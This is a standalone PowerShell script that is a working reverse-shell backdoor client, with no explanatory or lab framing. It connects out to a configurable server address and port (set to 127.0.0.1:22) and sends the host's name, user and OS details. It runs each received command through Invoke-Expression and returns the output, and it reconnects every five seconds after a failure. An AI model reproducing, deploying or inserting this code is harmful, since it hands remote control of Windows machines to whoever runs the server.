$ServerIP = "127.0.0.1"
$ServerPort = 22

function Get-SystemInfo {
    try {
        $hostname = [System.Net.Dns]::GetHostName()
        $username = [Environment]::UserName
        $os = Get-CimInstance -ClassName Win32_OperatingSystem
        $osName = $os.Caption -replace "Microsoft ", ""
        $version = $os.Version
        $architecture = $os.OSArchitecture

        return "$hostname,$username,$osName,$version,$architecture"
    } catch {
        return "Unknown,Unknown,Unknown,Unknown,Unknown"
    }
}

function Connect-Server {
    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $client.Connect($ServerIP, $ServerPort)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)

            $sysinfo = Get-SystemInfo
            $writer.WriteLine($sysinfo)
            $writer.Flush()

            $shouldContinue = Invoke-Shell -Stream $stream -Reader $reader -Writer $writer
            $client.Close()

            if (-not $shouldContinue) {
                break
            }
        } catch {
            Start-Sleep -Seconds 5
        }
    }
}

function Invoke-Shell {
    param(
        [Parameter(Mandatory=$true)] [System.Net.Sockets.NetworkStream] $Stream,
        [Parameter(Mandatory=$true)] [System.IO.StreamReader] $Reader,
        [Parameter(Mandatory=$true)] [System.IO.StreamWriter] $Writer
    )

    $currentDirectory = Get-Location

    while ($true) {
        try {
            $command = $Reader.ReadLine()
            if ([string]::IsNullOrWhiteSpace($command)) {
                break
            }

            if ($command.StartsWith("cd ")) {
                $path = $command.Substring(3).Trim()
                try {
                    Set-Location -Path $path -ErrorAction Stop
                    $currentDirectory = Get-Location
                } catch {
                    $Writer.WriteLine("Error: No such directory: $path")
                }
                try {
                    $Writer.WriteLine("__END__")
                    $Writer.Flush()
                } catch {}
                continue
            }

            if ($command -eq "die") {
                return $false
            }

            try {
                # Execute the command and capture its output
                $output = & {
                    $result = Invoke-Expression $command 2>&1
                    $result | Out-String
                }
            } catch {
                $output = "Error executing command: $_"
            }

            if ($output) {
                $lines = $output -split "`r?`n"
                foreach ($line in $lines) {
                    try {
                        $Writer.WriteLine($line)
                    } catch {
                        break
                    }
                }
                try {
                    $Writer.WriteLine("__END__")
                    $Writer.Flush()
                } catch {}
            } else {
                try {
                    $Writer.WriteLine("__END__")
                    $Writer.Flush()
                } catch {}
            }

        } catch {
            try {
                $Writer.WriteLine("Error: $_")
                $Writer.WriteLine("__END__")
                $Writer.Flush()
            } catch {}
            break
        }
    }

    return $true
}


Connect-Server
